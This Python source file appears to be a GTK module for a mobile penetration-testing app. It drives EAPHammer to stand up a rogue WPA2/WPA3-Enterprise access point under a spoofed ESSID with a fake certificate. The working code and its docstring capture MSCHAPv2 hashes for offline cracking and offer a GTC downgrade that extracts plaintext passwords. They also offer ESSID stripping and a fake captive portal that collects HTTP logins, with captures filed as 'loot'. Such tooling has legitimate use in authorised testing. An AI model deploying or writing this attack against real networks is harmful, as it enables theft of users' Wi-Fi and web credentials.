"""EAPHammer -- rogue WPA2/3-Enterprise AP for capturing EAP hashes.

Upstream: https://github.com/s0lst1c3/eaphammer

The tool stands up a WPA-Enterprise (802.1X) AP that accepts any
username/password: it terminates PEAP / EAP-TTLS with a self-signed
cert and prints the resulting MSCHAPv2 challenge/response, which
looks like this:

    <user>::<realm>:<challenge>:<response>:<domain>

That line is a hashcat mode 5500 "netNTLMv1" hash. **We do not run
hashcat on the phone** -- per the app's design the pcap/hash files
land in the central loot store and go to whichever cracker the
operator prefers offline.

Setup steps the module walks the user through:

1. Generate the RADIUS server cert (``eaphammer --cert-wizard``)
   once per install. The wizard prompts for CN/O/etc; we run it
   in the phone's own terminal (not the app) because it needs a
   TTY.
2. Pick the SSID to spoof + the mode:
   * ``wpa-eap`` for WPA2 Enterprise (the common case).
   * ``wpa3-eap`` for WPA3 Enterprise if the target uses it.
   * Optional GTC downgrade -- some Windows supplicants will fall
     back to plaintext EAP-GTC if we say we do not speak MSCHAPv2.
     Extremely valuable when it works.
3. Start the rogue AP. As stations associate, hashes appear in the
   log and in the ``loot/<hostname>-eaphammer.log`` file.

The captured hash file (``~/.eaphammer/loot/hostapd-wpe.log`` by
default) is copied into our loot tree so it shows up in the Loot
module alongside PMKID and handshake captures.
"""
from __future__ import annotations

import os
import re
import time
from pathlib import Path

from gi.repository import Adw, GLib, Gtk

from ..executor import Process, Result, run_async
from ..loot_store import get_loot_store, loot_path
from ..module import NHModule, register
from ..widgets import OutputView, toast

DEFAULT_IFACE = "wlan1"

# eaphammer's hostapd-wpe writes creds to <cwd>/loot/hostapd-wpe.log.
# The path is fixed by the upstream binary; we copy from it into our
# central loot tree once the capture stops.
_EAP_LOOT_LOG = "/usr/share/eaphammer/local/hostapd-wpe.log"

# Regex matching one MSCHAPv2 hash line from eaphammer's stream. Not
# used for parsing per-se -- just to count captures for the UI meter.
_MSCHAP_RE = re.compile(
    r"^([^:\s]+)::([^:]*):([0-9a-f]{16}):([0-9a-f]{48})",
    re.IGNORECASE | re.MULTILINE)


@register
class EAPHammer(NHModule):
    title = "EAP relay"
    icon = "dialog-password-symbolic"
    description = ("Rogue WPA2/3-Enterprise AP with EAPHammer; captures "
                   "MSCHAPv2 hashes from clients that trust our cert.")
    required_tools = ["eaphammer"]

    def __init__(self, app_window):
        super().__init__(app_window)
        self._proc: Process | None = None
        self._loot_id: int | None = None
        self._hashes_seen: int = 0

    def build(self) -> Gtk.Widget:
        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=12)
        for m in ("top", "bottom", "start", "end"):
            getattr(box, "set_margin_" + m)(12)

        # ---- cert wizard
        cert_group = Adw.PreferencesGroup(
            title="RADIUS certificate",
            description="Needed once. EAPHammer signs a fake CA and "
                        "server cert with any values you like; "
                        "clients that don't cert-pin will accept it.")
        cert_row = Adw.ActionRow(
            title="Run cert wizard",
            subtitle="Opens a terminal; follow the prompts")
        cert_btn = Gtk.Button(label="Open wizard",
                              valign=Gtk.Align.CENTER)
        cert_btn.add_css_class("suggested-action")
        cert_btn.connect("clicked",
                         lambda _b: self._open_cert_wizard())
        cert_row.add_suffix(cert_btn)
        cert_group.add(cert_row)
        box.append(cert_group)

        # ---- attack config
        cfg_group = Adw.PreferencesGroup(title="Rogue AP config")
        self.iface = Adw.EntryRow(title="Interface")
        self.iface.set_text(DEFAULT_IFACE)
        cfg_group.add(self.iface)

        self.essid = Adw.EntryRow(title="ESSID to spoof")
        cfg_group.add(self.essid)

        self.channel = Adw.SpinRow.new_with_range(1, 165, 1)
        self.channel.set_title("Channel")
        self.channel.set_value(1)
        cfg_group.add(self.channel)

        self.auth_mode = Adw.ComboRow(title="EAP mode")
        self.auth_mode.set_model(Gtk.StringList.new([
            "wpa-eap (WPA2 Enterprise)",
            "wpa3-eap (WPA3 Enterprise)",
            "wpa-eap-tls (TLS-only, mostly for testing)",
        ]))
        cfg_group.add(self.auth_mode)

        self.negot_gtc = Adw.SwitchRow(
            title="Try GTC downgrade",
            subtitle="Refuse MSCHAPv2; some Windows supplicants "
                     "fall back to plaintext EAP-GTC")
        cfg_group.add(self.negot_gtc)

        self.essid_strip = Adw.SwitchRow(
            title="ESSID stripping",
            subtitle="Peel one character at a time until a probe "
                     "matches a network in a client's PNL")
        cfg_group.add(self.essid_strip)

        self.hostile_portal = Adw.SwitchRow(
            title="Hostile portal (HTTP creds)",
            subtitle="Serve a fake portal to also grab HTTP form logins")
        cfg_group.add(self.hostile_portal)

        run_row = Adw.ActionRow(
            title="Start / Stop",
            subtitle="Hashes appear in the log as clients join")
        self.start_btn = Gtk.Button(label="Start",
                                    valign=Gtk.Align.CENTER)
        self.start_btn.add_css_class("suggested-action")
        self.start_btn.connect("clicked",
                               lambda _b: self._start())
        run_row.add_suffix(self.start_btn)
        self.stop_btn = Gtk.Button(label="Stop",
                                   valign=Gtk.Align.CENTER)
        self.stop_btn.set_sensitive(False)
        self.stop_btn.connect("clicked",
                              lambda _b: self._stop())
        run_row.add_suffix(self.stop_btn)
        cfg_group.add(run_row)
        box.append(cfg_group)

        # ---- status
        stat_group = Adw.PreferencesGroup(title="Session")
        self.state_row = Adw.ActionRow(
            title="Status", subtitle="idle")
        stat_group.add(self.state_row)
        self.hits_row = Adw.ActionRow(
            title="EAP hashes captured", subtitle="0")
        stat_group.add(self.hits_row)
        self.loot_row = Adw.ActionRow(
            title="Loot", subtitle="View captured hashes")
        loot_btn = Gtk.Button(label="Open Loot",
                              valign=Gtk.Align.CENTER)
        loot_btn.connect(
            "clicked", lambda _b: self.app_window.activate_module(
                "loot", "module:eaphammer"))
        self.loot_row.add_suffix(loot_btn)
        stat_group.add(self.loot_row)
        box.append(stat_group)

        # ---- log
        self.output = OutputView()
        box.append(self.output)
        return box

    def _open_cert_wizard(self) -> None:
        # The wizard is interactive so we spawn it in the phone's own
        # terminal (kgx / gnome-terminal / xterm, whichever the user
        # has installed). Root because eaphammer writes into its
        # install dir.
        script = (
            "term=$(command -v kgx || command -v gnome-terminal "
            "|| command -v xterm || echo xterm); "
            "if [ \"$term\" = kgx ] || echo \"$term\" | grep -q gnome-terminal; then "
            "  $term -- sudo eaphammer --cert-wizard; "
            "else "
            "  $term -e sudo eaphammer --cert-wizard; "
            "fi &"
        )
        run_async(["sh", "-c", script],
                  lambda _r: None, root=False, timeout=5)

    def _start(self) -> None:
        if self._proc is not None and self._proc.running:
            return
        essid = self.essid.get_text().strip()
        if not essid:
            toast(self.app_window, "Set an ESSID first")
            return
        iface = self.iface.get_text().strip() or DEFAULT_IFACE

        auth_map = {0: "wpa-eap", 1: "wpa3-eap", 2: "wpa-eap-tls"}
        auth = auth_map[self.auth_mode.get_selected()]

        argv = [
            "eaphammer",
            "-i", iface,
            "-e", essid,
            "-c", str(int(self.channel.get_value())),
            "--auth", auth,
        ]
        if self.negot_gtc.get_active():
            argv += ["--negotiate", "gtc-downgrade"]
        if self.essid_strip.get_active():
            argv += ["--essid-stripping"]
        if self.hostile_portal.get_active():
            argv += ["--hostile-portal", "--captive-portal"]
        # Always print creds live and to the log.
        argv += ["--creds"]

        self.output.append("$ " + " ".join(argv) + "\n")

        stamp = time.strftime("%Y%m%d-%H%M%S")
        safe = re.sub(r"[^A-Za-z0-9_-]+", "_", essid)
        log_path = loot_path(
            "eaphammer", "eap-%s-%s.log" % (safe, stamp))
        self._hashes_seen = 0
        self.hits_row.set_subtitle("0")

        self._loot_id = get_loot_store().record(
            module="eaphammer", type="eap_hash",
            target=essid, path=log_path,
            notes="rogue EAP AP starting")

        def on_line(text: str) -> None:
            self.output.append(text)
            try:
                with open(log_path, "a") as fp:
                    fp.write(text)
            except OSError:
                pass
            hits = len(_MSCHAP_RE.findall(text or ""))
            if hits:
                self._hashes_seen += hits
                self.hits_row.set_subtitle(str(self._hashes_seen))
                if self._loot_id is not None:
                    get_loot_store().append_notes(
                        self._loot_id,
                        "hash captured (%d total)"
                        % self._hashes_seen)

        def on_done(code: int) -> None:
            self.output.append("[eaphammer exited: %d]\n" % code)
            self._proc = None
            self.start_btn.set_sensitive(True)
            self.stop_btn.set_sensitive(False)
            self.state_row.set_subtitle("stopped")
            # Also import hostapd-wpe.log if it exists -- eaphammer
            # writes there too and it's the canonical crack format.
            if os.path.exists(_EAP_LOOT_LOG):
                try:
                    with open(_EAP_LOOT_LOG) as src, \
                         open(log_path, "a") as dst:
                        dst.write("\n--- hostapd-wpe.log ---\n")
                        dst.write(src.read())
                except OSError:
                    pass
            if self._loot_id is not None:
                get_loot_store().refresh_size(self._loot_id)

        self._proc = Process(
            argv, on_line, on_done, root=True)
        self._proc.start()
        self.start_btn.set_sensitive(False)
        self.stop_btn.set_sensitive(True)
        self.state_row.set_subtitle("running")

    def _stop(self) -> None:
        if self._proc is not None:
            self._proc.stop()
        self.stop_btn.set_sensitive(False)
        self.state_row.set_subtitle("stopping…")

    def set_target(self, target: str) -> None:
        parts = target.split("|") if target else []
        if len(parts) > 0 and parts[0]:
            self.essid.set_text(parts[0])
        if len(parts) > 2 and parts[2]:
            try:
                self.channel.set_value(int(parts[2]))
            except ValueError:
                pass
